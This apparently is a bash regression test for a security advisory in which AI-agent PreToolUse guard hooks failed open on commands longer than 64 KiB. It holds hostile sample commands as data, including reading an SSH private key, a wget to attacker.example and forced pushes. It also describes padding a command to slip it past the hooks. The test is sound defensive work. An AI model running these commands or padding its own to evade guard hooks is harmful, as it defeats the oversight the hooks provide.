#!/bin/bash
# tests/ghsa-xxjm-long-input-matchers.test.sh — regression for GHSA-xxjm-mhfm-xq5v.
#
# GHSA-xxjm: seven PreToolUse matchers decided whether a command matched a rule by writing the
# whole command into a pipe read by `grep -q`, under `set -o pipefail`. grep exits at its first
# matching line. When the command is longer than the pipe's capacity (64 KiB) and the matching
# line comes early, the writer still has text to push: it takes SIGPIPE (status 141) or, where
# SIGPIPE is ignored, a write error (status 1 on GNU printf). pipefail promotes that status to the
# pipeline's, and the matcher reads "no match" — the rule does not fire. The fix feeds each matcher
# by HERE-STRING, so there is no second process to die, and refuses when bash cannot create the
# temp file a here-string needs, so the fix's own prerequisite cannot fail open in its turn.
#
# The sites (one per hook): the matches() helper of block-destructive, block-rm-prefer-trash,
# block-fs-boundary, block-egress and block-shell-injection; the gh-write gate of
# block-gh-path-leak; the filing-verb gate of block-scope-segregation.
#
# Per hook, five arms against a COPY of the hook layout (never the shared sandbox's mode files):
#   short      the must-refuse first line alone refuses with rule ID X     (control: X is right)
#   long       the same line + inert padding past the pipe's capacity
#              refuses with the same X                                     (the fix)
#   benign     the same padding behind a benign first line is allowed      (control: padding inert)
#   old shape  on a copy whose matcher is put back to the pipe shape, the
#              long form does NOT refuse with X                            (sensitivity: these arms
#                                                                           can tell the shapes apart)
#   no temp    with every temp-file write refused, the long form is still
#              refused by the hook — never exit 0                          (the here-string's own
#                                                                           prerequisite)
# plus one warn-mode arm pinning the degrade posture (ADR-078 D2, mode-coupled).
#
# WHY THE NO-TEMP ARMS USE THE LONG FORM. bash 3.2 backs every here-string with a temp file; bash
# 5.1 and later back one smaller than the pipe buffer with a pipe and fall back to a temp file
# above it. A short form would reach the temp-file path on one bash and not the other; the long
# form is past the pipe's capacity, so it needs the temp file on both. A probe confirms that in the
# interpreter the hooks run under, and where no temp file is needed the arms report NOT-EVALUATED.
#
# SIZING. The long command is ~96 KB of bytes but under 65,536 CHARACTERS (two-byte padding), and
# its payload stays under 128 KiB. Past the pipe's capacity, so the old shape fails; under Linux's
# per-argument cap (MAX_ARG_STRLEN), because every hook still hands its raw input to printf as an
# argument, and above that cap the arm would test that exec failure, not the matcher; under a
# 65,536-character length gate, so a hook carrying one still reaches the matcher. Each bound is
# asserted below, and an arm outside it is a FAIL, not a quiet pass.
#
# THE OLD-SHAPE ARMS DEPEND ON THE PROCESS'S SIGPIPE DISPOSITION. Where SIGPIPE is default, or on
# GNU printf where it is ignored, the old shape fails and these arms demonstrate it. On macOS with
# SIGPIPE ignored, /usr/bin/printf swallows the write error and the old shape happens to pass; the
# mechanism control detects that and the old-shape arms report RESIDUAL instead of a verdict. The
# long arms hold either way: a here-string has no writer to signal.
#
# THE OLD SHAPE'S MISS IS A RACE. The writer fills the pipe, grep drains it, and the rest of the
# command still fits: when the writer is scheduled before grep exits, its last write lands, it exits
# 0, and the rule fires. Under heavy load that happens. So the mechanism control and each old-shape
# arm make up to SENS_TRIES runs and pass on the first miss: the question they answer is whether the
# old shape CAN miss. The fixed shape has no race, so its arms run once.
#
# Self-contained: builds its own layout copies, so it runs identically in the setup-ci-layout.sh
# sandbox and standalone from it. bash 3.2-safe. No payload is executed: every command here is
# data handed to a hook on stdin.

set -u

HOOK_DIR="$(cd "$(dirname "$0")/.." && pwd -P)"
CLAUDE_DIR="$(cd "${HOOK_DIR}/.." && pwd -P)"
JQ=/usr/bin/jq
PASS=0
FAIL=0

pass() { /usr/bin/printf 'PASS: %s\n' "$1"; PASS=$((PASS+1)); }
fail() { /usr/bin/printf 'FAIL: %s\n' "$1"; [ -n "${2:-}" ] && /usr/bin/printf '  %s\n' "$2"; FAIL=$((FAIL+1)); }
arm_invalid() { /usr/bin/printf 'FAIL: %s (INDETERMINATE: %s)\n' "$1" "$2"; FAIL=$((FAIL+1)); }

WORK="$(/usr/bin/mktemp -d 2>/dev/null)" || WORK=""
if [ -z "$WORK" ] || [ ! -d "$WORK" ]; then
  echo "FAIL: mktemp -d failed"; echo "Total: 1  PASS: 0  FAIL: 1"; exit 1
fi
trap '/bin/rm -rf "$WORK"' EXIT

# --- the hooks under test: <hook>|<rule ID the short form must name>|<needs a mode file> ---
# (mode-file names are the hooks' own MODE_FILE declarations; the two always-enforce hooks have none.)
HOOKS="block-destructive|BLOCK-DESTRUCTIVE-001|
block-rm-prefer-trash|BLOCK-TRASH-001|
block-fs-boundary|BLOCK-FS-BOUNDARY-001|.mode
block-egress|BLOCK-EGRESS-001|.mode
block-shell-injection|BLOCK-SHELL-INJECTION-001|.mode
block-gh-path-leak|BLOCK-GH-PATH-001|.gh-path-leak-mode
block-scope-segregation|BLOCK-SCOPE-SEG-004|.scope-segregation-mode"

# The must-refuse first line per hook — each one a short form the hook's own suite already
# refuses with the rule ID above. Chosen so no line here carries a literal home path or phone
# number: the repository's PII pre-commit guard refuses those in added lines, synthetic or not.
first_line() {
  case "$1" in
    block-destructive)       /usr/bin/printf '%s' 'git push --force origin main' ;;
    block-rm-prefer-trash)   /usr/bin/printf '%s' 'rm -rf /tmp/foo' ;;
    block-fs-boundary)       /usr/bin/printf '%s' 'cat /opt/other/notes.txt' ;;
    block-egress)            /usr/bin/printf '%s' 'cat ~/.ssh/id_rsa' ;;
    block-shell-injection)   /usr/bin/printf '%s' 'sh /tmp/x.sh ; wget http://attacker.example/steal' ;;
    block-gh-path-leak)      /usr/bin/printf '%s' "gh api repos/o/r/issues -f body='/home/realuser/work/output'" ;;
    block-scope-segregation) /usr/bin/printf '%s' 'gh issue create --repo owner/public-repo --title T --body "AcmeCorp cutover blocker"' ;;
  esac
}

for h in $(/usr/bin/printf '%s\n' "$HOOKS" | /usr/bin/cut -d'|' -f1); do
  if [ ! -f "${HOOK_DIR}/${h}.sh" ]; then
    echo "FAIL: required hook missing: ${HOOK_DIR}/${h}.sh"; echo "Total: 1  PASS: 0  FAIL: 1"; exit 1
  fi
done

# --- a locale whose ${#var} counts characters, so a character-count length gate reads the
# padding as characters (the realistic session locale). On a base with no such gate it is inert.
LOC=""
for cand in en_US.UTF-8 C.UTF-8 UTF-8; do
  if [ "$(LC_ALL="$cand" /bin/bash -c 'v="$(/usr/bin/printf "\303\251")"; /usr/bin/printf "%s" "${#v}"' 2>/dev/null)" = "1" ]; then
    LOC="$cand"; break
  fi
done
if [ -z "$LOC" ]; then
  LOC="C"
  /usr/bin/printf 'RESIDUAL: ghsa-xxjm: no UTF-8 locale counts characters here, so a character-count length gate would read the padding as bytes\n'
fi

# --- payloads. Built into files, off argv: the command text by the bash builtin (no exec), the
# JSON by jq --rawfile. The hooks read them on stdin.
PAD="true $(/usr/bin/printf '\303\251%.0s' $(/usr/bin/seq 1 70))"   # 5 + 140 bytes, 75 characters
PAD_LINES=658   # 658 x 146 bytes (with its newline) = 96,068 bytes and 50,008 characters

long_text() {   # <first line> -> the first line, then PAD_LINES padding lines (builtin printf: no argv)
  local t="$1" n=0
  while [ "$n" -lt "$PAD_LINES" ]; do
    t="${t}"$'\n'"${PAD}"
    n=$((n+1))
  done
  printf '%s' "$t"
}

# make_payload <name> <command text> -> writes ${WORK}/<name>.json and ${WORK}/<name>.cmd
make_payload() {
  printf '%s' "$2" > "${WORK}/$1.cmd"
  "$JQ" -n --rawfile c "${WORK}/$1.cmd" '{tool_name:"Bash", tool_input:{command:$c}, cwd:"/tmp"}' > "${WORK}/$1.json"
}

file_bytes() { /usr/bin/wc -c < "$1" | /usr/bin/tr -d '[:space:]'; }
cmd_chars() { LC_ALL="$LOC" /bin/bash -c 'v="$(/bin/cat "$1")"; /usr/bin/printf "%s" "${#v}"' _ "$1"; }

# --- layout copies. NEW = the hooks as shipped; OLD = the same with each matcher put back to the
# pipe shape this advisory fixes. Copies, so the shared sandbox's mode files are never written.
build_layout() {   # <dest>
  /bin/mkdir -p "$1/.claude" "$1/.cfg" "$1/.config/pmo-platform" || return 1
  /bin/cp -R "$HOOK_DIR" "$1/.claude/hooks" || return 1
  /bin/rm -rf "$1/.claude/hooks/tests"
  local f
  for f in "$CLAUDE_DIR"/*.txt; do [ -f "$f" ] && /bin/cp "$f" "$1/.claude/"; done
  /usr/bin/printf '[security_hooks]\nmaster_enabled = true\n' > "$1/.cfg/platform-config.toml"
  # block-scope-segregation's fixtures, the same ones its own suite seeds.
  /usr/bin/printf '%s\n' '[identity]' 'operator_name = "Test Operator"' '[trackers.work]' 'id = "work"' \
    'platform = "jira"' 'identifier = "PROJ"' 'scope = "private"' '[trackers.personal]' 'id = "personal"' \
    'platform = "github-issues"' 'identifier = "owner/public-repo"' 'scope = "public"' \
    > "$1/.config/pmo-platform/operator.toml"
  /usr/bin/printf 'AcmeCorp\nAcme Cutover\n' > "$1/needles.txt"
  /usr/bin/printf '# test allowlist\n# ---\n\n' > "$1/.claude/scope-segregation-allowlist.txt"
  return 0
}

# to_old_shape <hook file> -> 0 when the file now carries the pipe shape (converted, or already so)
# The fixed shape is one line per site:   { <v>=0; "$GREP" -qE <re> || <v>=$?; } <<< "$<TEXT>"
# and the pipe shape it replaces:          <v>=0; "$PRINTF" '%s' "$<TEXT>" | "$GREP" -qE <re> || <v>=$?
# A pre-fix hook carries the original pipe shape (`"$PRINTF" '%s' "$<TEXT>" | "$GREP" -qE`) already.
to_old_shape() {
  local f="$1" n_new n_old
  n_new="$(/usr/bin/grep -cE '\{ _[a-z_]*rc=0; "\$GREP" -qE .* \|\| _[a-z_]*rc=\$\?; \} <<< "\$(COMMAND|COMMAND_CMDPOS)"' "$f")"
  if [ "$n_new" = 1 ]; then
    /usr/bin/sed -E 's/\{ (_[a-z_]*rc)=0; ("\$GREP" -qE .*) \|\| (_[a-z_]*rc)=\$\?; \} <<< ("\$(COMMAND|COMMAND_CMDPOS)")/\1=0; "$PRINTF" '"'"'%s'"'"' \4 | \2 || \3=$?/' "$f" > "$f.old" \
      && /bin/cat "$f.old" > "$f" && /bin/rm -f "$f.old" || return 1
  elif [ "$n_new" != 0 ]; then
    return 1
  fi
  n_old="$(/usr/bin/grep -cE '"\$PRINTF" '"'"'%s'"'"' "\$(COMMAND|COMMAND_CMDPOS)" \| "\$GREP" -qE' "$f")"
  [ "$n_old" = 1 ]
}

NEW="${WORK}/new"; OLD="${WORK}/old"
if ! build_layout "$NEW" || ! build_layout "$OLD"; then
  echo "FAIL: could not build the layout copies under $WORK"; echo "Total: 1  PASS: 0  FAIL: 1"; exit 1
fi
OLD_OK=1
for h in $(/usr/bin/printf '%s\n' "$HOOKS" | /usr/bin/cut -d'|' -f1); do
  if ! to_old_shape "${OLD}/.claude/hooks/${h}.sh"; then
    arm_invalid "old shape: ${h}" "its matcher is neither the fixed here-string shape nor the pipe shape this suite knows; update to_old_shape with the hook"
    OLD_OK=0
  fi
done

set_mode() {   # <layout> <mode-file name> <mode>
  [ -n "$2" ] && /usr/bin/printf '%s' "$3" > "$1/.claude/hooks/$2"
  return 0
}

# run_hook <layout> <hook> <payload file> <stderr file>  -> sets RC
# The scope-guard root and master-enable root point at the layout, as every sibling suite does.
# Only block-scope-segregation gets the layout as HOME (its operator.toml) and the needle file.
hook_home()    { if [ "$2" = block-scope-segregation ]; then /usr/bin/printf '%s' "$1"; else /usr/bin/printf '%s' "${HOME:-}"; fi; }
hook_needles() { if [ "$2" = block-scope-segregation ]; then /usr/bin/printf '%s' "$1/needles.txt"; else /usr/bin/printf '%s' "${PMO_LOCALIZED_NEEDLES:-}"; fi; }
run_hook() {
  local L="$1" h="$2" p="$3" e="$4"
  RC=0
  env PMO_SCOPE_GUARD_ROOT=/ PMO_PLATFORM_CONFIG_ROOT="${L}/.cfg" LC_ALL="$LOC" \
      HOME="$(hook_home "$L" "$h")" PMO_LOCALIZED_NEEDLES="$(hook_needles "$L" "$h")" \
      /bin/bash "${L}/.claude/hooks/${h}.sh" < "$p" > /dev/null 2> "$e" || RC=$?
}

# run_hook_notemp — the same with every temp-file write refused: a file-size limit of 0 with
# SIGXFSZ ignored, so a write fails with EFBIG instead of killing the hook (the mechanism of
# block-fragile-refs.test.sh's nf_arm). stderr travels through a pipe, which the limit spares.
run_hook_notemp() {   # <layout> <hook> <payload file>  -> sets RC and ERR
  local L="$1" h="$2" p="$3" hh hn
  hh="$(hook_home "$L" "$h")"; hn="$(hook_needles "$L" "$h")"
  RC=0
  ERR="$( (trap '' XFSZ; ulimit -f 0
           exec env PMO_SCOPE_GUARD_ROOT=/ PMO_PLATFORM_CONFIG_ROOT="${L}/.cfg" LC_ALL="$LOC" \
             HOME="$hh" PMO_LOCALIZED_NEEDLES="$hn" \
             /bin/bash "${L}/.claude/hooks/${h}.sh" 2>&1 >/dev/null) < "$p" )" || RC=$?
}
err2k() { /usr/bin/head -c 2048 <<< "$ERR"; }

names_rule() { /usr/bin/grep -qF ":$2]" "$1"; }   # <stderr file> <rule ID>
head2k() { /usr/bin/head -c 2048 "$1"; }

# --- the mechanism control: does the old shape fail at this size, in this process? ---------
LONG_PROBE="$(long_text 'git push --force origin main')"
printf '%s' "$LONG_PROBE" > "${WORK}/probe.cmd"
SENS_TRIES=10
MECH_RC=0
MECH_TRY=0
while [ "$MECH_TRY" -lt "$SENS_TRIES" ]; do
  MECH_TRY=$((MECH_TRY+1))
  MECH_RC=0
  ( set -o pipefail; /usr/bin/printf '%s' "$LONG_PROBE" | /usr/bin/grep -qE '^git' ) || MECH_RC=$?   # sigpipe-idiom: allow — the mechanism control reproduces the defect's own shape on purpose, to learn whether this process can demonstrate it
  [ "$MECH_RC" != 0 ] && break
done
if [ "$MECH_RC" != 0 ]; then
  /usr/bin/printf 'MECHANISM: the pipe shape misses a first-line match at %s bytes in this process (status %s, run %s of up to %s)\n' "$(file_bytes "${WORK}/probe.cmd")" "$MECH_RC" "$MECH_TRY" "$SENS_TRIES"
  MECH=1
else
  /usr/bin/printf 'RESIDUAL: ghsa-xxjm: the pipe shape did not fail here (SIGPIPE ignored and a printf that swallows the write error), so the old-shape arms report no verdict; the long arms still hold\n'
  MECH=0
fi

# --- the temp-file probe: does a here-string of the long form's size need a temp file in the
# interpreter the hooks run under? The control run, without the limit, must succeed, or the probe
# itself is broken and the no-temp arms prove nothing.
heredoc_probe() {   # [limit] -> the probe's exit status
  if [ "${1:-}" = limit ]; then
    ( trap '' XFSZ; ulimit -f 0
      exec /bin/bash -c 'v="$(/bin/cat "$1")"; { :; } <<< "$v"' _ "${WORK}/probe.cmd" ) 2>/dev/null
  else
    /bin/bash -c 'v="$(/bin/cat "$1")"; { :; } <<< "$v"' _ "${WORK}/probe.cmd" 2>/dev/null
  fi
}
NOTEMP=0
if ! heredoc_probe; then
  arm_invalid "temp-file probe control" "a here-string of the long form failed even without the limit"
elif heredoc_probe limit; then
  /usr/bin/printf 'RESIDUAL: ghsa-xxjm: NOT-EVALUATED — /bin/bash here backs a %s-byte here-string without a temp file, so the temp-file-refused arms have nothing to refuse; this is not a clean result for them\n' "$(file_bytes "${WORK}/probe.cmd")"
else
  NOTEMP=1
fi

# --- the arms ---------------------------------------------------------------------------------
BENIGN_LONG="$(long_text 'true start')"
make_payload benign "$BENIGN_LONG"

while IFS='|' read -r h rule mf <&3; do
  [ -n "$h" ] || continue
  fl="$(first_line "$h")"
  make_payload "${h}-short" "$fl"
  make_payload "${h}-long" "$(long_text "$fl")"
  set_mode "$NEW" "$mf" enforce
  set_mode "$OLD" "$mf" enforce

  # bounds: past the pipe's capacity, under the per-argument cap, under a 65,536-character gate
  cb="$(file_bytes "${WORK}/${h}-long.cmd")"; jb="$(file_bytes "${WORK}/${h}-long.json")"; cc="$(cmd_chars "${WORK}/${h}-long.cmd")"
  if [ "$cb" -le 70000 ] || [ "$jb" -ge 131072 ] || [ "$cc" -ge 65536 ]; then
    arm_invalid "${h}: long arm sizing" "command ${cb} B (must exceed 70000), payload ${jb} B (must stay under 131072), ${cc} characters (must stay under 65536)"
    continue
  fi

  run_hook "$NEW" "$h" "${WORK}/${h}-short.json" "${WORK}/e"
  if [ "$RC" = 2 ] && names_rule "${WORK}/e" "$rule"; then pass "${h}: short form refuses with ${rule}"
  else fail "${h}: short form refuses with ${rule}" "exit=${RC} stderr: $(head2k "${WORK}/e")"; fi

  run_hook "$NEW" "$h" "${WORK}/${h}-long.json" "${WORK}/e"
  if [ "$RC" = 2 ] && names_rule "${WORK}/e" "$rule"; then pass "${h}: ${cb}-byte multi-line form refuses with the same ${rule}"
  else fail "${h}: ${cb}-byte multi-line form refuses with the same ${rule}" "exit=${RC} stderr: $(head2k "${WORK}/e")"; fi

  run_hook "$NEW" "$h" "${WORK}/benign.json" "${WORK}/e"
  if [ "$RC" = 0 ]; then pass "${h}: the same padding behind a benign first line is allowed"
  else fail "${h}: the same padding behind a benign first line is allowed" "exit=${RC} stderr: $(head2k "${WORK}/e")"; fi

  if [ "$OLD_OK" = 1 ] && [ "$MECH" = 1 ]; then
    slipped=0; try=0
    while [ "$try" -lt "$SENS_TRIES" ]; do
      try=$((try+1))
      run_hook "$OLD" "$h" "${WORK}/${h}-long.json" "${WORK}/e"
      if ! names_rule "${WORK}/e" "$rule"; then slipped=1; break; fi
    done
    if [ "$slipped" = 1 ]; then
      pass "${h}: on the pipe-shape copy the long form slips past ${rule} (sensitivity; run ${try} of up to ${SENS_TRIES})"
    else
      fail "${h}: on the pipe-shape copy the long form slips past ${rule} (sensitivity)" "the old shape refused in all ${SENS_TRIES} runs (last exit=${RC}): this arm cannot tell the shapes apart. stderr: $(head2k "${WORK}/e")"
    fi
  elif [ "$OLD_OK" = 1 ]; then
    /usr/bin/printf 'RESIDUAL: ghsa-xxjm: %s old-shape arm not run (mechanism did not reproduce here)\n' "$h"
  fi

  # Any refusal of this hook's own satisfies it: before the fix some hooks already refuse here
  # under another label (a canary or a routing step whose own here-string fails first). What
  # must never happen is exit 0 — the rule not firing because its input was never read.
  if [ "$NOTEMP" = 1 ]; then
    run_hook_notemp "$NEW" "$h" "${WORK}/${h}-long.json"
    if [ "$RC" = 2 ] && /usr/bin/grep -qF "[CLAUDE-HOOK:${h}:" <<< "$ERR"; then
      pass "${h}: with temp-file writes refused the long form is still refused, never allowed"
    else
      fail "${h}: with temp-file writes refused the long form is still refused, never allowed" "exit=${RC} stderr: $(err2k)"
    fi
  fi
done 3<<EOF
$HOOKS
EOF

# --- the mode-coupled degrade (ADR-078 D2): in warn, a matcher that cannot be fed stands down
# loudly and names why; it does not pretend the rules ran.
if [ "$NOTEMP" = 1 ]; then
  set_mode "$NEW" .mode warn
  run_hook_notemp "$NEW" block-egress "${WORK}/block-egress-long.json"
  if [ "$RC" = 0 ] && /usr/bin/grep -qF ':INPUT-NOT-EVALUATED] WARN (degraded' <<< "$ERR"; then
    pass "block-egress (warn): with temp-file writes refused it degrades with INPUT-NOT-EVALUATED, exit 0"
  else
    fail "block-egress (warn): with temp-file writes refused it degrades with INPUT-NOT-EVALUATED, exit 0" "exit=${RC} stderr: $(err2k)"
  fi
  set_mode "$NEW" .mode enforce
fi

echo ""
echo "Total: $((PASS+FAIL))  PASS: ${PASS}  FAIL: ${FAIL}"
[ "$FAIL" -eq 0 ]
